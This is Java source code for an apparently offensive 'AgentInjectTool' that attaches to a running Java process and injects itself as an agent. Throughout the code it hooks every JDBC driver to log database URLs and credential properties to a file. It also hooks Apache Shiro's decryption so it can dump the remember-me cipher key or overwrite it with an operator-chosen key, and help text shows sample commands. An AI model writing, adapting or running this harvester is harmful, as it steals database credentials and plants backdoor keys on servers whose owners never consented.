package com.abc;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import javassist.*;

import java.io.File;
import java.io.FileOutputStream;
import java.io.UnsupportedEncodingException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.reflect.Method;
import java.net.URLDecoder;
import java.sql.Driver;
import java.util.HashMap;
import java.util.List;
import java.util.Properties;

public class Main {
    private static HashMap dbConnMap = new HashMap();
    public static String arg2;

    public static void main(String[] args) throws Throwable{
        if (args.length == 0){
            help();
            return;
        }
        Class.forName("sun.tools.attach.HotSpotAttachProvider");
        String option = args[0].trim();
        if ("list".equals(option)){
            List<VirtualMachineDescriptor> vms = VirtualMachine.list();
            System.out.println("vm count: " + vms.size());
            for (int i = 0; i < vms.size(); i++) {
                VirtualMachineDescriptor vm = vms.get(i);
                System.out.println(String.format("pid: %s displayName:%s",vm.id(),vm.displayName()));
            }
        }else if ("inject".equals(option) && args.length >= 2) {
            String targetPid = args[1];
            String arg2 = args[2];
            VirtualMachine virtualMachine = VirtualMachine.attach(targetPid);
            // 第一个参数是代理jar包，第二个参数是给代理jar包传入参数
            virtualMachine.loadAgent(getJarFileByClass(Main.class), arg2);
            System.out.println(arg2 + " is injected");
            System.out.println("inject ok!");

        }else {
            help();
        }
    }
    public static void help(){
        System.out.println("java -jar AgentInjectTool.jar list\n" +
                "java -jar AgentInjectTool.jar inject targetPid outFile\n" +
                "\t\tjava -jar AgentInjectTool.jar inject 19716 c:/windows/temp/databaseconn.txt\n" +
                "\t\tjava -jar AgentInjectTool.jar inject 19716 shiro_keys \n");
    }
    // 获取代理jar包的路径
    public static String getJarFileByClass(Class cs) {
        String fileString=null;
        String tmpString;
        if (cs!=null) {
            tmpString=cs.getProtectionDomain().getCodeSource().getLocation().getFile();
            if (tmpString.endsWith(".jar")) {
                try {
                    fileString= URLDecoder.decode(tmpString,"utf-8");
                } catch (UnsupportedEncodingException e) {
                    fileString=URLDecoder.decode(tmpString);
                }
            }
        }

        return new File(fileString).toString();
    }


    public static void agentmain(String agentArg, Instrumentation inst){
        arg2 = agentArg;
        Class[] classes  = inst.getAllLoadedClasses();

        for (int i = 0; i < classes.length; i++) {
            Class clazz = classes[i];
            try {
                // 判断类clazz是否是Driver.class的子类、实现类
                if (Driver.class.isAssignableFrom(clazz)){
                    ClassPool classPool = new ClassPool(true);
                    // 加入clazz的classpath
                    classPool.insertClassPath(new ClassClassPath(clazz));
                    // 加入类加载器
                    classPool.insertClassPath(new LoaderClassPath(clazz.getClassLoader()));
                    CtClass ctClass = classPool.get(clazz.getName());
                    // 获取类中的connect方法
                    CtMethod ctMethod = ctClass.getMethod("connect","(Ljava/lang/String;Ljava/util/Properties;)Ljava/sql/Connection;");
                    // 修改connect方法，再开头加入代码
                    ctMethod.insertBefore(String.format("                    try {\n" +
                            "                        java.lang.Class.forName(\"%s\",true,java.lang.ClassLoader.getSystemClassLoader()).getMethod(\"add\", new java.lang.Class[]{java.lang.String.class, java.util.Properties.class}).invoke(null,new java.lang.Object[]{$1,$2});\n" +
                            "                    }catch (java.lang.Throwable e){\n" +
                            "                        e.printStackTrace();\n" +
                            "                        \n" +
                            "                    }",Main.class.getName()));
                    inst.redefineClasses(new ClassDefinition(clazz,ctClass.toBytecode()));
                    ctClass.detach();
                }
            }catch (Throwable e){
                e.printStackTrace();
            }
        }


        Class cls = null;
        try {
            cls = Class.forName("org.apache.shiro.mgt.AbstractRememberMeManager");
            for(int i = 0; i < classes.length; i++) {
                Class clazz = classes[i];
                try {
                    // 判断类clazz是否是org.apache.shiro.mgt.AbstractRememberMeManager.class的子类、实现类
                    if(cls.isAssignableFrom(clazz)){
                        ClassPool classPool = new ClassPool(true);
                        classPool.insertClassPath(new ClassClassPath(clazz));
                        classPool.insertClassPath(new LoaderClassPath(clazz.getClassLoader()));
                        CtClass ctClass = classPool.get(clazz.getName());
                        CtMethod ctMethod = ctClass.getMethod("decrypt", "([B)[B");
                        ctMethod.insertBefore(String.format("java.lang.String temp = \"%s\";\n" +
                                "if(temp.endsWith(\"\\.txt\")){" +
                                "try {\n" +
                                "   " +
                                "   java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(new java.io.File(temp),true);\n" +
                                "   fileOutputStream.write(\"Shiro key: \".getBytes());\n" +
//                                "   java.lang.System.out.println(\"get shiro keying\");\n" +
//                                "   java.lang.System.out.println(org.apache.shiro.codec.Base64.encodeToString(getDecryptionCipherKey()));\n" +
                                "   fileOutputStream.write(org.apache.shiro.codec.Base64.encodeToString(getDecryptionCipherKey()).getBytes());\n" +
                                "   fileOutputStream.write(\"\\n\".getBytes());\n" +
                                "   fileOutputStream.flush();\n" +
                                "   fileOutputStream.close();\n}" +
                                "catch(java.lang.Throwable e){\n" +
//                                " e.printStackTrace();\n" +
                                "}\n}else{\n" +
                                "try{\n" +
                                "setCipherKey(org.apache.shiro.codec.Base64.decode(temp));\n" +
//                                "java.lang.System.out.println(\"set shiro key ing！\");\n" +
                                "}catch(java.lang.Throwable e){\n" +
//                                "e.printStackTrace();" +
                                "\n}\n}\n",arg2));
                        inst.redefineClasses(new ClassDefinition(clazz,ctClass.toBytecode()));
                        ctClass.detach();
                    }


                }catch (Throwable e){
                    e.printStackTrace();
                }
            }
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }

    }
    private static boolean eq(String url,String properties) throws Throwable{
        if (dbConnMap.containsKey(url)) {
            String valueProperties=(String) dbConnMap.get(url);
            if (valueProperties.indexOf(properties)!=-1) {
                return true;
            }else {
                if (valueProperties.length()>2000) {
                    valueProperties="";
                }
                dbConnMap.put(url, valueProperties+"\t"+properties);
                return true;
            }
        }
        return false;
    }

    public static void add(String url, Properties info) {
        try {
            String propertiesString = info.toString();
            if (dbConnMap.size() > 200) {
                dbConnMap.clear();
            }
            if (!eq(url, propertiesString)) {
                FileOutputStream fileOutputStream = new FileOutputStream(new File(arg2), true);
                fileOutputStream.write(String.format("JdbcUrl:%s\tproperties:%s\r\n", url, info).getBytes());
                fileOutputStream.flush();
                fileOutputStream.close();
                dbConnMap.put(url, propertiesString);
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }



}
